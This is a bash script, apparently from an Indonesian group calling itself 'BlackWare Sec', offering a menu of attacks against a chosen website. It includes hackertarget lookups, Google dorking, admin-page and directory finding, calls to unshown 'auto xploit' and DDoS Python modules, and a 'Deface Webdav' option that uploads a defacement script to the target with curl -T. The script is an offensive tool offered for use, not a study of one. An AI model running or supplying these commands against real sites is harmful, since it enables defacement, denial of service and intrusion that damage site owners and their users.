# Gak Usah Recode Stah Hanya Simple Tools ^_^
g="\033[32;1m"
y="\033[33;1m"
i="\033[34;1m"
r="\033[31;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
clear
echo $r
figlet BlackWare Sec
echo $w
echo "[  ---------------------------------------  ]"
echo
echo "Tools      : Tester Vulnstabylity Website"
echo "Version    : 1.3"
echo "Created By : BlackWare Security"
echo "Copyright  : 2k19 - BlackWare Sec"
echo
echo "[  ---------------------------------------  ]"
echo ""
echo $g""
read -p "root@BlackWare_Sec : " cmd
if [ $cmd = "help" ]
then
echo $w"- Testing Subdomain : subdo"
echo "- Testing Header : header"
echo "- Auto Xploit : xploit"
echo "- Dorking Tools : dork"
echo "- Ddos : ddos"
echo "- Admin finder : adfin"
echo "- Reverse Ip : ip"
echo "- Deface Webdav : webdav"
echo "- Scan _DIR_ : dir"
echo "- Tracking ip : tracking ip"
echo "- DNS Lookup : Dns"
sh vuln-scanner
fi
if [ $cmd = "subdo" ]
then
echo $w
echo "Target ( Ex : www.target.com ) not http/https :"
echo $g
read -p "root@BlackWare_Sec :" web
curl https://api.hackertarget.com/hostsearch/?q=$web
fi
if [ $cmd = "header" ]
then
echo $w
echo "Target ( Ex : www.target.com ) not http/https :"
echo $g
read -p "root@BlackWare_Sec :" web1
curl https://api.hackertarget.com/httpheaders/?q=$web1
echo
fi
if [ $cmd = "xploit" ]
then
cd modules
python2 scan.py
fi
if [ $cmd = "dork" ]
then
echo $w
read -p "Dork : " dork1
echo $g
xdg-open "https://www.google.co.id/search?q=$dork1"
fi
if [ $cmd = "ddos" ]
then
cd modules
python2 ddos.py
fi
if [ $cmd = "adfin" ]
then
cd modules
python2 adfin.py
fi
if [ $cmd = "ip" ]
then
echo $w
read -p "Ip Your Target : " ip
echo $g
curl https://api.hackertarget.com/reverseiplookup/?q=$ip
echo
fi
if [ $cmd = "webdav" ]
then
echo $w
read -p "Your Targer : " target
read -p "Lokasi Script Deface : " file
echo $g
curl -T $file $target
fi
if [ $cmd = "dir" ]
then
pip2 install dirhunt
clear
echo $w"Your Target ( Ex : https://www.target.com / http://target.com  )"
echo $g
read -p "Your Target : " target1
dirhunt $target1
fi
if [ $cmd = "tracking ip" ]
then
echo $g
read -p "Ip Target : " target_ip
curl https://api.hackertarget.com/geoip/?q=$target_ip
echo
fi
if [ $cmd = "dns" ]
then
echo $g
read -p "Your Target : " target_dns
curl https://api.hackertarget.com/dnslookup/?q=$target_dns
echo
fi
